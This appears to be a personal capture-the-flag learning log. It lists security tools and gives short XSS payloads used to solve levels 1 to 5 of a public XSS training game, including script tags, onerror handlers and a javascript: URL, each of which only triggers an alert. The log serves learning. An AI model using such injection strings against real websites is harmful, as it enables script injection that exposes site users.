# My CTF Journey

Welcome to my Capture The Flag (CTF) learning journey! Here, I document the challenges I've solved and the skills I've gained in the world of cybersecurity.


## Network Security

### CTF 1

**Tools:**
- Nmap
- Wireshark
- Metasploit

**Knowledge Base:**
[Link to Network Security Knowledge Base](#)

---

## Web Application Security
### XSS
##### CTF 1 : [XSS-GAMES.APPSPOT](https://medium.com/@onehackman/learning-xss-part-1-reflected-xss-brief-concept-techniques-challenge-walkthrough-85f6b165541b)
**Level 1**
```javascript
<script>alert()</script>
```

**Level 2**
```javascript
<img src=x onerror=alert(1)>
```

**Level 3**
```javascript
https://xss-game.appspot.com/level3/frame#23' onerror=alert()>
```

```javascript
23' onerror=alert()>
```

**Level 4**
```javascript
1');alert('1
```

**Level 5**
```javascript
javascript:alert()
```

##### CTF 2
**Tools:**
- Burp Suite
- OWASP Zap
- SQLMap

**Knowledge Base:**
[Link to Web Application Security Knowledge Base](#)

---

## Cryptocurrency Security

### CTF 3

**Tools:**
- Ganache
- Remix IDE
- MythX

**Knowledge Base:**
[Link to Cryptocurrency Security Knowledge Base](#)

